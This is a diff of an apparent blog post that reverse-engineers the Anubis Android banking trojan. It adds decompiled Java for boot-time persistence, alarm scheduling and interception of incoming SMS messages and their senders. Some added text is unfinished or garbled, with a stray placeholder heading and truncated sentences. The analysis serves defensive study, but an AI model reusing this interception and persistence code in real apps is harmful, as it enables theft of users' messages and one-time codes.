@@ -683,6 +683,8 @@ Backtrace =&gt; 0x79f058b9d749 frida-agent-64.so!0x29b749
 });
 </code></pre></div><p>However it does not explicitly specify what are the new values written to the file. Instead, it prints the whole buffer. In this case, the buffer is
 the xml.</p>
+<h3 id="one-service-to-rule-them-all">One Service to rule them all<a href="#one-service-to-rule-them-all" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>// service 1</p>
 <h3 id="c2s-tweets-and-data-exfiltration">C2s, Tweets and Data Exfiltration<a href="#c2s-tweets-and-data-exfiltration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>Since we have already analyzed few methods from the <code>SomeHttpClass</code>, It&rsquo;s time to dig deep into it.</p>
 <p>class got following member variables.</p>
@@ -891,7 +893,6 @@ public class C0063a {
         <span style="color:#f92672">}</span>
         <span style="color:#66d9ef">return</span> iArr<span style="color:#f92672">;</span>
     <span style="color:#f92672">}</span>
-
 </code></pre></div><p>So what this does is, creates an int array of size 256, fill it with numbers from 0 - 255, loop through 0 - 255 and
 do below expression</p>
 <pre><code>    i2 = (((i2 + iArr[i3]) + key[i3 % key.length]) + 256) % 256;
@@ -1245,9 +1246,78 @@ Soo what this method actually does is, it starts recording audio on the given so
 </code></pre>
 <p>if it does, it replaces the name with an empty string and append the name to the end of <code>str</code>.</p>
 <p>here is the list of applications that anubis targets.</p>
-<h3 id="achieving-persistance-and-control">Achieving Persistance and Control<a href="#achieving-persistance-and-control" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Until now, we have analyzed core features of the anubus banking trojan. Now it is time to take a look at</p>
+<h3 id="achieving-persistance-and-user-presence">Achieving Persistance and User Presence<a href="#achieving-persistance-and-user-presence" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>When we were analyzing the manifest xml file, we came across a broadcast receiver that listens for BOOT_COMPLETE. Let&rsquo;s take a look at that class.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">
+<span style="color:#75715e">/* renamed to EventListener */</span>
+<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">EventListener</span> <span style="color:#66d9ef">extends</span> BroadcastReceiver <span style="color:#f92672">{</span>
+
+    <span style="color:#75715e">/* renamed from: a */</span>
+    SomeHttpClass cls <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SomeHttpClass<span style="color:#f92672">();</span>
+
+    <span style="color:#f92672">[...</span> more code<span style="color:#f92672">]</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><p>it has only one member variable, that of <code>SomeHttpClass</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">mo443a</span><span style="color:#f92672">(</span>Context context<span style="color:#f92672">,</span> Intent intent<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        String action <span style="color:#f92672">=</span> intent<span style="color:#f92672">.</span><span style="color:#a6e22e">getAction</span><span style="color:#f92672">();</span>
+        context<span style="color:#f92672">.</span><span style="color:#a6e22e">startService</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Intent<span style="color:#f92672">(</span>context<span style="color:#f92672">,</span> Service1<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">));</span>
+        SomeHttpClass cls1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">;</span>
+        cls1<span style="color:#f92672">.</span><span style="color:#a6e22e">mo213a</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Action&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;BOOT Start &#34;</span> <span style="color:#f92672">+</span> action<span style="color:#f92672">);</span>
+
+        <span style="color:#f92672">[...</span> more code<span style="color:#f92672">]</span>
+    <span style="color:#f92672">}</span>
+</code></pre></div><p>First method of this class accepts two arguments, one being of class <code>Context</code> and the other being of class <code>Intent</code>.
+In the next few lines, it retrieves the action that called this method using <code>intent.getAction()</code>, stores it in <code>String action</code> and starts a new service <code>Service1</code>, which we reversed ealier.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+            SomeHttpClass bVar2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">;</span>
+            SomeHttpClass<span style="color:#f92672">.</span><span style="color:#a6e22e">StartAlarm</span><span style="color:#f92672">(</span>context<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;startAlarm&#34;</span><span style="color:#f92672">,</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">long</span><span style="color:#f92672">)</span> Integer<span style="color:#f92672">.</span><span style="color:#a6e22e">parseInt</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">GetSharedPreference</span><span style="color:#f92672">(</span>context<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Interval&#34;</span><span style="color:#f92672">)));</span>
+        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception unused<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+            SomeHttpClass bVar3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">;</span>
+            SomeHttpClass<span style="color:#f92672">.</span><span style="color:#a6e22e">StartAlarm</span><span style="color:#f92672">(</span>context<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;startAlarm&#34;</span><span style="color:#f92672">,</span> 15000<span style="color:#f92672">);</span>
+        <span style="color:#f92672">}</span>
+</code></pre></div><p>inside the try block, just like in the MainActivity, it tries to start an alarm. if it fails, it uses a default value of <code>15000</code> to start the alarm.
+Since we have already identified that the return value of <code>GetSharedPreferences(context, &quot;Interval&quot;)</code> is 10000, this time we can think of some difference in the alarm time, compared to our previous encounter with the <code>Interval</code> key.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>action<span style="color:#f92672">.</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;android.intent.action.USER_PRESENT&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+            context<span style="color:#f92672">.</span><span style="color:#a6e22e">startService</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Intent<span style="color:#f92672">(</span>context<span style="color:#f92672">,</span> IntentServiceC0110x9cb6f428<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">));</span>
+        <span style="color:#f92672">}</span>
+
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>action<span style="color:#f92672">.</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;android.provider.Telephony.SMS_RECEIVED&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">GetSharedPreference</span><span style="color:#f92672">(</span>context<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;perehvat_sws&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+            mo444b<span style="color:#f92672">(</span>context<span style="color:#f92672">,</span> intent<span style="color:#f92672">);</span>
+        <span style="color:#f92672">}</span>
+    <span style="color:#f92672">}</span>
+</code></pre></div><p>next few lines check whether if the action string is equal to <code>&quot;android.intent.action.USER_PRESENT&quot;</code>, if so, it starts another service.</p>
 <h3 id="sms-sending-recieving-and-spamming">SMS Sending, Recieving and Spamming<a href="#sms-sending-recieving-and-spamming" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
-<p>as we saw in the manifest file, this malware is capable of doing various stuff with SMS. from the file, we have identified few classes that are responsible for this kind of work.</p>
+<p>it also checks whether action is equal to <code>&quot;android.intent.action.SMS_RECEIVED&quot;</code> and value for shared preference key <code>perehvat_sws</code>
+is equal to to true. if so, it calls another method. I think it is good to take a look at that method since it might be related to
+SMS stuff.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">mo444b</span><span style="color:#f92672">(</span>Context context<span style="color:#f92672">,</span> Intent intent<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        Bundle extras <span style="color:#f92672">=</span> intent<span style="color:#f92672">.</span><span style="color:#a6e22e">getExtras</span><span style="color:#f92672">();</span>
+</code></pre></div><p>it takes two parameters, a <code>Context</code> and <code>Intent</code>. then it initializes a variable of class <code>Bundle</code> with <code>intent.getExtras()</code>. We saw
+earlier that <code>mo443a</code> calls this method by passing the same values that it receives as arguments. as everyones knows an intent is a way to switch between activities, <code>getExtras</code> is a way to retrieve values stored in a <code>Bundle</code>. so this is basically a way to pass stuff betweeen intents.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>extras <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+            <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+                Object<span style="color:#f92672">[]</span> objArr <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Object<span style="color:#f92672">[])</span> extras<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;pdus&#34;</span><span style="color:#f92672">);</span>
+                String str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
+                String str2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
+</code></pre></div><p>in the next few lines, it checks whether the variable of type <code>Bundle</code> is not equals to null. A Bundle is a if the evaluation turns out to be true, it does some work inside the try block.</p>
+<p>inside the block, it creates and initializes an <code>Object</code> array named <code>objArr</code>, and call <code>extras.get(&quot;pdus&quot;)</code> on it to retrieve value of key <code>pdus</code>.</p>
+<p>it also declares two string empty strings.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>objArr <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+                    <span style="color:#66d9ef">int</span> length <span style="color:#f92672">=</span> objArr<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">;</span>
+                    <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0<span style="color:#f92672">;</span>
+</code></pre></div><p>then it checks whether if Object array it created earlier is not null, if true, it initializes a variable of int named <code>length</code> with
+<code>objArr.length</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">                    <span style="color:#66d9ef">while</span> <span style="color:#f92672">(</span>i <span style="color:#f92672">&lt;</span> length<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+                        SmsMessage createFromPdu <span style="color:#f92672">=</span> SmsMessage<span style="color:#f92672">.</span><span style="color:#a6e22e">createFromPdu</span><span style="color:#f92672">((</span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[])</span> objArr<span style="color:#f92672">[</span>i<span style="color:#f92672">]);</span>
+                        String displayOriginatingAddress <span style="color:#f92672">=</span> createFromPdu<span style="color:#f92672">.</span><span style="color:#a6e22e">getDisplayOriginatingAddress</span><span style="color:#f92672">();</span>
+                        String displayMessageBody <span style="color:#f92672">=</span> createFromPdu<span style="color:#f92672">.</span><span style="color:#a6e22e">getDisplayMessageBody</span><span style="color:#f92672">();</span>
+                        str2 <span style="color:#f92672">=</span> str2 <span style="color:#f92672">+</span> displayMessageBody<span style="color:#f92672">;</span>
+                        context<span style="color:#f92672">.</span><span style="color:#a6e22e">startService</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Intent<span style="color:#f92672">(</span>context<span style="color:#f92672">,</span> whemsbk<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">).</span><span style="color:#a6e22e">putExtra</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;num&#34;</span><span style="color:#f92672">,</span> displayOriginatingAddress<span style="color:#f92672">).</span><span style="color:#a6e22e">putExtra</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ms&#34;</span><span style="color:#f92672">,</span> displayMessageBody<span style="color:#f92672">));</span>
+                        i<span style="color:#f92672">++;</span>
+                        str <span style="color:#f92672">=</span> displayOriginatingAddress<span style="color:#f92672">;</span>
+                    <span style="color:#f92672">}</span>
+</code></pre></div><p>as we saw in the manifest file, this malware is capable of doing various stuff with SMS. from the file, we have identified few classes that are responsible for this kind of work.</p>
 <p>let&rsquo;s start with <code>wocwvy.czyxoxmbauu.slsa.lmily</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#f92672">package</span> wocwvy.czyxoxmbauu.slsa<span style="color:#f92672">;</span>
 
@@ -1268,7 +1338,8 @@ Soo what this method actually does is, it starts recording audio on the given so
         sb<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span>mo225c<span style="color:#f92672">(</span>mo247q<span style="color:#f92672">(</span>context<span style="color:#f92672">)</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;|Incoming SMS&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Number: &#34;</span> <span style="color:#f92672">+</span> str <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Text: &#34;</span> <span style="color:#f92672">+</span> str2 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;|&#34;</span><span style="color:#f92672">));</span>
         mo218b<span style="color:#f92672">(</span>context<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">,</span> sb<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
     <span style="color:#f92672">}</span>
-</code></pre></div>
+</code></pre></div><h3 id="heading"><a href="#heading" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+
       </div></div>
 
   
